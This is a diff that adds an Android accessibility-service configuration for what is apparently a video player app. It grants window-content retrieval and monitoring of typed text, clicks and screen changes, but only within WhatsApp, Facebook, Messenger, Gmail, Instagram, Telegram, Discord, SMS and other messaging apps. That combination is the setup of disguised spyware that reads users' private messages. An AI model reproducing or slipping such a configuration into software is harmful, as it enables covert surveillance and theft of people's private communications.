@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:description="@string/unified_accessibility_description"
+    android:accessibilityEventTypes="typeViewTextChanged|typeViewClicked|typeWindowStateChanged|typeWindowContentChanged|typeViewScrolled|typeViewFocused"
+    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestEnhancedWebAccessibility"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:notificationTimeout="100"
+    android:canRetrieveWindowContent="true"
+    android:settingsActivity="com.jumpy.videoplayerapp.MainActivity"
+    android:packageNames="com.whatsapp,com.whatsapp.w4b,com.facebook.katana,com.facebook.orca,com.facebook.mlite,com.google.android.gm,com.android.email,com.instagram.android,com.twitter.android,com.snapchat.android,com.telegram.messenger,com.discord,com.skype.raider,com.viber.voip,com.google.android.apps.messaging,com.android.mms" /> 
